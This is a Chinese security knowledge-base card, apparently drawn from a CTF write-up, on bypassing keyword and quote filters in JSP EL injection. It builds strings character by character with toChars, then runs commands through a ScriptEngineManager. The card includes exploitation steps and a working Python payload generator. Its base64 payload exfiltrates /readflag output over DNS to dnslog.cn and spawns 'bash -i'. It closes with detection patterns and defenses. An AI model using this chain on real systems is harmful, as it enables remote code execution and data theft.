---
id: web-java-expression-el-no-quote-tochars-string-construction-bypass
title: JSP EL 无引号字符串构造绕过：true.toString().charAt(0).toChars(N)[0].toString().concat 拼出类名与命令
type: scenario
domain: web
path: web/java/expression
technique: el-no-quote-tochars-string-construction
tags:
- java
- el
- expression-injection
- waf-bypass
- no-quote
- tochars
- scriptengine
- dns-exfil
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V534
  verified_at: '2026-11-11T17:16:45+08:00'
  notes: 已对照原文全文与30张截图逐张核对：img25 为完整 EL 载荷请求，true.getClass().forName 加载 toChars 拼出的 ScriptEngineManager，newInstance 后 getEngineByName JavaScript，再 eval toChars 拼出的 Runtime.exec 命令；img26 为 dnslog.cn 外带记录 sictf64177ed4-9254-dc2f-8d30-88aaef1b8264.waumze.dnslog.cn，与卡片原理/PoC 一致。dedup：JEXL 卡为 JEXL 语法加 1.toString 起手，EL scanner 卡为方括号加 concat 关键字拆分加 Scanner 回显，均非同链；dup-scan.json 不涉及。路径 web/java/expression 合法。未执行 payload
url: /docs/web/java/expression/web-java-expression-el-no-quote-tochars-string-construction-bypass/
draft: false
kb_aliases:
- EL 无引号绕过
- EL toChars 构造字符串
- JSP EL 关键字过滤 bypass
- true.toString().charAt(0).toChars
- EL ScriptEngineManager
- EL 注入 DNS 外带
---

## 一句话结论

当 JSP EL 注入点对请求原文做关键字/引号过滤时，可以在 `${...}` 内用纯字面量的方法链凭空构造任意字符串：`true.toString()` 得到 `"true"`，`.charAt(0)` 得到 `Character`，`.toChars(N)` 得到码点为 N 的 `char[]`，`[0].toString()` 还原为单字符 `String`，再用 `.concat(...)` 逐字符拼接出 `javax.script.ScriptEngineManager` 与 `java.lang.Runtime.getRuntime().exec("...")` 等完整类名/命令；请求中不出现被过滤的完整关键字，最终通过 Nashorn `ScriptEngine` 执行命令并用 DNS 外带结果。

## 原理

- **EL 求值语义**：JSP EL 会对 `${...}` 内的表达式求值，支持在字面量上调用方法、数组下标与链式调用。即使 WAF 拦截 `Runtime`、`exec`、引号等原始字符串，只要最终求值出的表达式语义完整，就能执行。
- **从布尔字面量得到字符串**：`true.toString()` 调用 `Boolean.toString()` 返回 `java.lang.String` 实例（`"true"`）；`.charAt(0)` 返回 `java.lang.Character`；`.toChars(N)` 返回 `char[]`（N 为 Unicode 码点）；`[0]` 取数组首元素；`.toString()` 把 `Character` 转为单字符 `String`。把每个目标字符用这段表达式生成，再用 `.concat(...)` 串起来，就能在完全不写字符串字面量的情况下拼出任意文本。
- **加载类与执行**：`true.getClass()` 返回 `java.lang.Boolean` 的 `Class` 对象，接着 `.forName(<拼出的类名>)` 调用 `Class.forName` 加载 `javax.script.ScriptEngineManager`；`.newInstance()` 实例化后 `.getEngineByName("JavaScript")` 取 Nashorn 引擎；`.eval(<拼出的命令>)` 在 JavaScript 引擎中执行 Java 代码，最终 `Runtime.getRuntime().exec(...)` 落地命令执行。`"JavaScript"` 这类未被过滤的短字符串可以直接保留。
- **为什么用 toChars 而不是普通拼接**：如果过滤规则同时拦截引号、`Runtime`、`getRuntime`、`exec` 等大量子串，仅用 `.concat('R'.concat('u'...))` 仍会留下被拦的引号或片段；把每个字符都换成 `toChars(N)`，请求中只剩数字与固定方法名，规则难以覆盖。
- **DNS 外带**：Nashorn 内执行 `bash -c {echo,<base64>}|{base64,-d}|{bash,-i}`，把 `curl \`/readflag\`.dnslog.cn` 之类的命令输出/执行结果编码进 DNS 查询名，再从 DNS 日志读取，解决无回显问题。
- **成立前提**：目标 EL 实现允许方法调用与反射（未启用严格沙箱）；JDK 版本带 Nashorn（JDK 8/11 常见）；EL 表达式被实际求值。

## 触发条件

- 应用把用户输入拼入 JSP EL 表达式并求值（`${...}`），且未做语法级白名单。
- WAF/过滤器只按原始请求字符串匹配关键字或引号，不会先做 EL 语义解析。
- 目标 EL 实现允许在字面量上调用方法、访问 `Class.forName`/反射；Nashorn 或等价脚本引擎可用。
- 攻击者可从 DNS/HTTP 日志读取外带结果（无回显场景）。

## 利用步骤

1. 用生成脚本把目标字符串（类名 `javax.script.ScriptEngineManager`、命令 `java.lang.Runtime.getRuntime().exec("bash -c ...")`）逐字符转成 `true.toString().charAt(0).toChars(<码点>)[0].toString()` 并用 `.concat()` 连接。
2. 组装 EL：`true.getClass().forName(<类名>).newInstance().getEngineByName("JavaScript").eval(<命令>)`，外层包 `${...}`。
3. 在注入点前加任意正常内容（如 `ABC `）确认 EL 被求值并观察响应/报错。
4. 命令执行后用 DNS/HTTP 外带：把输出 base64 后拼进解析器可用的子域名，或直接 `curl http://attacker/...`。
5. 在攻击者 DNS 日志中读取查询名并解码，取得命令输出或 flag。

## PoC

按字符生成表达式的脚本（原文提供，Python 3）：

```python
payload = "java.lang.Runtime.getRuntime().exec(\"bash -c {echo,Y3VybCBgL3JlYWRmbGFnYC5udzFybDkuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}\")"
print("true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0]), end="")
for i in range(1, len(payload)):
    print(".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i]), end="")
print("")
```

组装后的 EL（示意，真实载荷为逐字符 concat 的长串）：

```text
ABC ${true.getClass().forName(<toChars 拼出的 "javax.script.ScriptEngineManager">).newInstance().getEngineByName("JavaScript").eval(<toChars 拼出的命令>)}
```

原文最终在 DNS 日志中收到外带查询（如 `sictf<...>.dnslog.cn`），证明命令执行与数据外带成功。

## 变体与关联

- 关联：JEXL 场景的同类“数字方法链 + toChars 构造字符串”见 `web-java-expression-jexl-no-quote-string-construction-bypass`；本卡是 JSP EL 语言下的同类绕过，并进一步结合 `ScriptEngineManager` 执行命令。
- 关联：EL 注入的方括号/`concat` 关键字拆分与 Scanner 回显见 `web-java-expression-el-injection-waf-bypass-scanner-echo`；本卡针对同时过滤引号/大量子串的场景，用字符码点构造替代字符串字面量。
- 变体：`true.toString()` 可换成 `1.toString()`、`''.toString()` 等任意可转字符串的字面量；`toChars` 也可换成 `Character.toChars` 静态调用或 `String.valueOf(char[])`。

## 检测与防御

- 检测：请求参数中出现 `${` 与 `toChars`、`charAt(0)`、`concat`、`getClass`、`forName`、`ScriptEngineManager`、`getEngineByName` 等组合；响应出现 `class java.lang.`、`ProcessImpl@` 等对象串；DNS 日志出现异常子域名。
- 防御：不要把用户输入拼进 EL；使用 `SimpleEvaluationContext` 或显式变量白名单，禁用类型引用、反射与 `Class.forName`；移除/升级 Nashorn；WAF 做表达式语法级检测而不是字面关键字匹配。
